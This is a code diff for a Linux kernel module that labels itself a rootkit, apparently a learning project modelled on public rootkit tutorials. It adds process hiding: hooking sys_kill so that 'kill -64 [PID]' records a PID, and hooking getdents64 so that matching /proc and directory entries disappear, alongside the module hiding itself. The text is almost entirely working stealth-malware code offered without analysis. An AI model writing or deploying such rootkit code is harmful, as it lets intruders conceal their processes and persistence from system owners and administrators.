@@ -20,7 +20,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Alvin (guided with XCellerator");
 MODULE_DESCRIPTION("Rootkit hiding itself");
-MODULE_VERSION("0.01");
+MODULE_VERSION("0.05");
 
 
 // tracking variables: hiding rootkit.
@@ -50,6 +50,7 @@ void show_me(void){
 
 // The hooks and tracking variables needed to hide directories
 #define PREFIX "XxHidethisxX"
+char hide_proc[NAME_MAX]; //hide_proc gets filled at hooked sys_kill
 
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
@@ -63,7 +64,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	if (!dir_hiding){
 		return ret;
 	}
-	
+
   dirent_scratch = kzalloc(ret, GFP_KERNEL);
 
   if( ret <=0 || dirent_scratch==NULL ){
@@ -78,7 +79,10 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
   while(offset < ret){
     current_dir = (void*)dirent_scratch + offset;
 
-    if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
+
+    if ((memcmp(hide_proc, current_dir->d_name, strlen(hide_proc)) == 0
+				&& strncmp(hide_proc, "", NAME_MAX) != 0)
+				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0){
       printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
       if (current_dir == dirent_scratch){
         ret -= current_dir->d_reclen;
@@ -117,10 +121,16 @@ static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 
 asmlinkage int hook_kill(const struct pt_regs *regs){
 	int sig = regs->si;
+	pid_t pid = regs->di;
+
 	if(sig == 64 && !hidden){
 		hide_me();
 		hidden = 1;
 		dir_hiding = 1;
+
+		printk(KERN_INFO "trying to hide %d\n", pid);
+		sprintf(hide_proc, "%d", pid); //usage: kill -64 [PID to hide]
+
 		return 0;
 	}
 	else if(sig == 64 && hidden){
@@ -145,7 +155,6 @@ static struct ftrace_hook hooks[] = {
 
 
 int __init my_init(void){
-
 	int err;
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err){
